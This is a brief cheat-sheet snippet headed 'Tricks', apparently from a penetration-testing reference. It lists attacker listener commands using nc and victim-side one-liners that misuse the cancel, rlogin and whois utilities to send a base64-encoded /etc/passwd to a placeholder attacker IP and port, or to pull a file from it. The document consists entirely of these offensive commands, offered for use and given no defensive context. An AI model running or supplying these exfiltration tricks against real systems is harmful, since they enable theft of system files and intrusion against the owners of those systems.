## Tricks
```bash
Attacker: nc -lvnp 4444
Victim:
cancel -u "$(cat /etc/passwd | base64)" -h <ip>:<port>
rlogin -l "$(cat /etc/passwd | base64)" -p <port> <ip>
```

```
Attacker: cat file.txt | nc -vv -l -p 8000
Victim:  whois -h <ip> -p 8000 "gimmehell" > newfile.txt
```
